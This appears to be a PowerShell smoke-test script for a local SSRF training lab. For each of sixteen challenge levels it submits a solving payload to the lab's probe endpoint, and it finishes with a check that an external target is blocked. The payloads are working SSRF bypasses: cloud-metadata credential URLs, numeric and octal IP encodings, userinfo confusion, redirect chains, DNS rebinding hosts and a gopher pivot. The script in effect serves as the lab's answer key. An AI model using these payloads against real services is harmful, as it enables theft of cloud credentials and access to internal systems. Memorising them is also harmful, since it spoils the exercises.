$ErrorActionPreference = 'Stop'

try {
    $bootstrap = Invoke-RestMethod -Uri 'http://127.0.0.1:8080/api/bootstrap' -TimeoutSec 3
} catch {
    throw 'The lab is not running. Start it with .\start.ps1 first.'
}

if ($bootstrap.challenges.Count -ne 16) {
    throw "Expected 16 challenges, found $($bootstrap.challenges.Count)."
}

foreach ($challenge in $bootstrap.challenges) {
    if ($challenge.cause.points.Count -ne 4) {
        throw "Challenge $($challenge.id) does not contain four vulnerability causes."
    }
}

$level6 = $bootstrap.challenges | Where-Object { $_.id -eq 6 }

$cases = @(
    @{
        level = 1
        label = 'direct metadata access'
        url = 'http://127.0.0.1:8082/latest/meta-data/iam/security-credentials/lab-role'
    },
    @{
        level = 2
        label = 'blacklist numeric IP bypass'
        url = 'http://2130706433:8081/admin'
    },
    @{
        level = 3
        label = 'keyword allowlist bypass'
        url = 'http://127.0.0.1:8081/internal/debug?source=shop.local'
    },
    @{
        level = 4
        label = 'redirect bypass'
        url = 'http://127.0.0.1:8083/redirect?to=http%3A%2F%2F127.0.0.1%3A8081%2Fadmin'
    },
    @{
        level = 5
        label = 'avatar CDN DNS rebinding'
        url = 'http://avatar-7f3a.cdn-preview.ssrf.lab:8082/latest/meta-data/iam/security-credentials/lab-role'
    },
    @{
        level = 6
        label = 'file protocol smuggling'
        url = $level6.target
    },
    @{
        level = 7
        label = 'URL component confusion'
        url = 'http://shop.local@127.0.0.1:8081/internal/parser'
    },
    @{
        level = 8
        label = 'legacy IPv4 encoding'
        url = 'http://0177.0.0.1:8081/internal/encoding'
    },
    @{
        level = 9
        label = 'mixed public and loopback DNS answers'
        url = 'http://media-2f9c.dual-cdn.ssrf.lab:8081/internal/dns-mixed'
    },
    @{
        level = 10
        label = 'multi-hop redirect'
        url = 'http://127.0.0.1:8083/redirect/chain?to=http%3A%2F%2F127.0.0.1%3A8081%2Fadmin'
    },
    @{
        level = 11
        label = 'X-Forwarded-Host driven SSRF'
        url = 'http://127.0.0.1:8080/webhook/test'
        fields = @{ headerHost = '127.0.0.1:8081' }
    },
    @{
        level = 12
        label = 'blind SSRF callback'
        url = 'http://127.0.0.1:8084/callback?token=blind-level12'
    },
    @{
        level = 13
        label = 'gopher TCP pivot'
        url = 'gopher://127.0.0.1:6380/_GET%20flag%0D%0A'
    },
    @{
        level = 14
        label = 'cloud metadata hostname variant'
        url = 'http://metadata.google.internal:8082/computeMetadata/v1/instance/service-accounts/default/token'
    },
    @{
        level = 15
        label = 'renderer secondary request'
        url = 'http://127.0.0.1:8084/renderer-page?target=http%3A%2F%2F127.0.0.1%3A8081%2Finternal%2Frenderer'
    },
    @{
        level = 16
        label = 'RSS enclosure import'
        url = 'http://127.0.0.1:8084/malicious-feed.xml'
    }
)

$failed = @()
foreach ($case in $cases) {
    $payload = @{
        level = $case.level
        url = $case.url
    }
    if ($case.ContainsKey('fields')) {
        $payload.fields = $case.fields
    }
    $body = $payload | ConvertTo-Json -Depth 5 -Compress

    try {
        $response = Invoke-RestMethod `
            -Uri 'http://127.0.0.1:8080/api/probe' `
            -Method Post `
            -ContentType 'application/json' `
            -Body $body `
            -TimeoutSec 12
    } catch {
        $failed += "L$($case.level) $($case.label): request failed - $($_.Exception.Message)"
        continue
    }

    if ($response.result.solved -eq $true) {
        Write-Host "PASS  L$($case.level)  $($case.label)"
    } else {
        $failed += "L$($case.level) $($case.label): $($response.result.validation.message)"
        Write-Host "FAIL  L$($case.level)  $($case.label)" -ForegroundColor Red
    }
}

$boundaryBody = @{
    level = 1
    url = 'http://192.0.2.10:8082/latest/meta-data'
} | ConvertTo-Json -Compress

$boundaryResponse = Invoke-RestMethod `
    -Uri 'http://127.0.0.1:8080/api/probe' `
    -Method Post `
    -ContentType 'application/json' `
    -Body $boundaryBody `
    -TimeoutSec 5

if ($boundaryResponse.result.blocked -eq $true) {
    Write-Host 'PASS  boundary external target is blocked'
} else {
    $failed += 'Boundary test: external target was not blocked'
}

if ($failed.Count -gt 0) {
    Write-Host ''
    Write-Host 'Failures:' -ForegroundColor Red
    $failed | ForEach-Object { Write-Host "  $_" -ForegroundColor Red }
    exit 1
}

Write-Host ''
Write-Host 'All SSRF lab smoke tests passed.' -ForegroundColor Green

